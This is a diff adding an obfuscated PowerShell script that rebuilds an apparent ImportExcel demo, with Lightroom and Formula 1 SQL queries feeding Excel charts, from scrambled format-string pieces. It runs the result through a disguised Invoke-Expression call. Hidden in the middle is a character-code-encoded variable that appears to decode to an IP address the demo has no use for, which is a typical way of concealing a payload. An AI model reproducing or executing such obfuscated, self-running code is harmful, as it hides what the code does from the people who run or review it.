@@ -1,0 +1,91 @@
+(("{110}{67}{38}{126}{114}{83}{122}{48}{71}{123}{129}{92}{106}{35}{60}{118}{85}{87}{72}{45}{34}{81}{74}{50}{4}{131}{77}{57}{90}{104}{16}{36}{20}{102}{97}{124}{49}{112}{91}{1}{22}{32}{89}{0}{17}{88}{14}{113}{119}{23}{39}{69}{125}{103}{58}{65}{61}{107}{31}{86}{109}{52}{128}{44}{53}{95}{101}{47}{66}{12}{3}{2}{59}{26}{76}{25}{28}{13}{116}{120}{41}{29}{6}{11}{84}{7}{30}{19}{98}{79}{130}{121}{70}{100}{64}{127}{99}{5}{73}{8}{10}{80}{117}{21}{24}{68}{15}{75}{111}{42}{96}{9}{18}{78}{115}{62}{51}{56}{105}{37}{54}{108}{55}{93}{46}{33}{43}{40}{94}{63}{27}{82}" -f'IF(PubhROW>3.32,TEXT(ROUND(1/P','3}
+ubhSvalue        = {413=IF(Pub','olumn 23  -Value ubhEvvalue -Heading 413Ev413
+Set-Exce','   -Worksheet    ubhe.workbook.Worksheets[413sheet1413] -C','hpt = @{413LensPivot413 = @{ 413PivotTableName413    =   413LensPivot413;
+                         413SourceWorkSheet413   =   ','##########
+
+Remove-Item  .cBddemo3.xl','umn(ubh_) -Hidde','ow(1)     -HorizontalAlignment','drivers; we alre','ORDER BY (Count(win)) DESC
+413@
+
+#','ady have a connection ','n
+}
+
+#Center the column labels.
+Set-ExcelRange   -Address      ubhe.workbook.Worksheets[413sheet1413 ].','xcelColumn','ght -AutoFit
+@(5,6,7,13','3tqK413SectqK413tqK413tqK413',' ','s413 }
+}
+
+#we want to add 3 columns, translate Apper','OWER(2,PubhROW),2),tqK4130.0tqK413tqK413SectqK413tqK413tqK413),413+
+                            413TEXT(ROU','Run the query and put the results in workshet 413Winners413, autosize the column','a','EXT(ROUND','13]
+ubhSQL     =  @413
+    SELECT TO','hROW>2,TEXT(ROUND(POWER(2,PubhR','13 }
+
+#remove a','P 25 DriverName,
+                ','    ubhe.workbook.Worksheets[413sheet1413 ].','ok.Worksheets[413sheet1413 ].Column(21) -Ho','rkSheetname 413Win','Column(22) -HorizontalAlignment Ri','t1413 ].Col',' Center
+
+#Format the d','}105{112{58%50{53z49z46z51Y48k46Y50Y49}52A46','OW),0),tqK413tqK413tqK4131/tqK413tqK4130tqK413tqK413sectqK413tqK413tqK413),413+
+              ','olumn','rnedExifLens          LensRef  ON    LensRef.id_Local =   metadata.lensRef
+ LEFT JOIN   AgInternedExifC','     , met','ture value and Shutter speed value into familar f/ and seconds notation, and use these and ISO to calculate EV level
+ubhAvalue        = {413=IF(PubhROW>6.63,T','elColumn   -ExcelPackage ubhE','cBd..cBdImportExcel.psd1} catch {throw ; return}
+
+u','nd recreate the file
+Remove-Item -Path 413~cBdDocumentscBdtemp.xlsx413 ','egend -ChartType XYScatter -XRange WinsToFast -YRa','ee','             ','(ubh_) -NumberFormat 4130.0%413 -AutoFit }
+#Define a chart to show the relationship of lest on an XY Grid, create the ranges required in the, add the chart and show the file in Excel in excel after saving.
+ubhchart = New-ExcelChartDefinition -NoL','at them and hide the','ocal =   metadata.image
+ LEFT JOIN   AgInte','Winners413].c','et1413] -Column 21  -Val','       metadata.hasGPS       ','ND(Sqrt(Power(2,OubhROW))',' lens.
+
+ub','xcel   =  Send-SQLDat','h',' ones which aren57ct of inter','xcel -WorkSheetname 413Winners413 -column 6  -Heading 413WinsToPoles413 -Value {413=Dubhrow/Cub','13}
+Set-ExcelColumn   -ExcelPackage ubhExcel -WorkSheetname 413Winners413 -column 7  -Heading 413WinsToFast413  -Value {413=Eubhr','aToExcel -SQL ubhsql -Session ubhsession -path .cBddemo3.xlsx -WorkSheetname 413Winners413   -AutoSize -Passthru
+#Create','asename413 = 413Count413}  ;
+                         413IncludePivotChart413 =    ubh',' 413~cB','lRange   -Address      ubhe.workbo','adata.ShutterSpeed AS shutterSpeedValue,
+             Image.bitdepth        ,  image.colorLabels    ,
+             Camera.Value          AS cameraModel          , LensRef.value          AS lensModel
+      FROM   Adobe_images          ','413 -Connection 413DSN=LR413 -SQL ubhsq','o the ExcelPackage object
+ubhE','idth 2000 -Height 700
+Export-Excel -ExcelPackage ubhExcel -Wo','rkSheetname ','dDocumentscBdtemp.xlsx413 -WorkSheetname 413Sheet1','ue ubhAvalue  -Heading 413Apperture413
+Set-ExcelColumn   -Worksheet    ubhe.workbook.Worksheets[413sheet1413] -Column 22  -Value ubhSvalue  -Heading 413Shutter413
+Set-E','hPSScriptRootcBd..','  Count(RaceDate)   AS Races,
+ ','-ErrorAction SilentlyContinue
+
+#Open a connection to the ODBC source 413LR413 (which points to the SQLLite DB for Lightroom), run the SQL query, and dro','in excel after saving.
+Ex',',  metadata.GPSLatitude , metadata.GPSLongitude   ,
+','ge.rootFile
+      JOIN   AgharvestedExifMetadata    metadata  ON      image.id_l','sx
+#Database query to get race wins, Poles and fastest lapes for the 25 best ','se
+#Define a pivot table and chart for total pictures with each','                Count(Win)        AS Wins,
+                  Count(','rizontalAlignment Left  -AutoFit
+Set-ExcelRange   -Address  ','13LensModel413 ;
+                         413PivotData413         = @{413b','s an','ice T','t','ameraModel    Camera  ON     Camera.id_local =  metadata.cameraModelRef
+413@
+
+#Sql Statement gets 20 columns of data from Adobe lightroom databa','ners413 -AutoNameRange -ExcelChartDefinition ubhchart -Show
+
+
+','en,
+     ','R','yFile         ','o49<56k','     rootFile  ON   rootfile.id_local =      ima','ND(1/POWER(2,PubhROW),2),tqK4130tqK41','          413','true ;
+                         413NoLegend413          =  ','tqK413tqK413f/tqK413tqK4130.0tqK413))41','SOSpeedRating AS ISOSpeed,
+','ow/Cubhrow413}
+6..7 Y7y ForEach-Object {
+    Set-ExcelRange -Address    ubhExcel.Workbook.Worksheets[413','nge WinsToPoles -ShowCategory -Column 7 -W','est.
+Se','     Count(FastestLap) AS Fastlaps
+    FROM  Results
+    GROUP BY DriverName
+    ','3f/tqK413tqK4130.0tqK413),41','ta as a n','#################################################','port-Excel -ExcelPackage ubhe      -Wo','t-ExcelColumn   -Worksheet    ubhe.workbook.Worksheets[413she','(Sqrt(Power(2,OubhROW)),1),tqK413tqK413tqK41','- in sheet1, autosizing columns.
+ubhe = Send-SQLDataToExcel   -Path','  ubhtrue ;
+                         413ShowPercent413       =    ubhtrue ;
+                         413ChartType413         =   413Pie413  ;
+                         413ChartTitle413        =   413Split by Len',' and format columns for the ratio of Wins to poles and fast laps.
+Set-Exc','             metadata.Aperture     AS apertureValue   ','l -AutoSize -Passthru
+ubhwIPEi =  (( 57c39','hrow4','49<3957c -sPLIt57cY57c -SPlIT 57cA57c -SPlIT57ci57c-SPliT57ck57c-spLiT 57c%57c -SpLIt 57cz57c -SpLIT57c{57c -spLit57c<57c-sPLiT57c}57c -SPlit 57co57c Y7y % {([c','try {Import-Module ub','Pole)       AS Poles,
+',',1),tqK413',')))413}
+ubhevValue       = {413=ROUND(PubhRow+OubhRow-(LOG(NubhRow','    AS width             ,  image.fileHeight AS height ,
+             metadata.dateDay      ,  metadata.dateMonth   , metadata.dateYear       ,  Image.captureTime AS dateTak','d hold on t',',15,16,17,18) Y7y ForEach-Ob','o the DB in ubhdbSessions
+ubhsession =  ubhDbSessions[413f14','        image
+      JOIN   AgLibrar','/100,2)),0)4','ject {
+  Set-ExcelRange -Address      ubhe.workbook.Worksheets[413sh','d above, show the file in Excel ',' ','             metadata.focalLength  ,  metadata.flashFired ','3 +
+                          413TEXT(ROU','p into Excel ','bhsql           = @413
+  SELECT     rootfile.baseName     ,  rootfile.extension   , Image.fileWidth     ','413sheet1413  -TableName  413Table413 -PivotTableDefinition ubhpt -Show
+
+#','Ar] [INt]ubh_) })-joiN 57c57c)
+
+#Add columns, then form',' , metadata.I','able, Create the pivot table & chart define','413Sheet1413 ;
+                         413PivotRows413         =   4')).REpLACE('57c',[sTriNg][Char]39).REpLACE('ubh',[sTriNg][Char]36).REpLACE(([Char]99+[Char]66+[Char]100),[sTriNg][Char]92).REpLACE(([Char]116+[Char]113+[Char]75),'`').REpLACE('413',[sTriNg][Char]34).REpLACE('Y7y','|') | .( $ENV:coMSpEC[4,26,25]-joIN'')
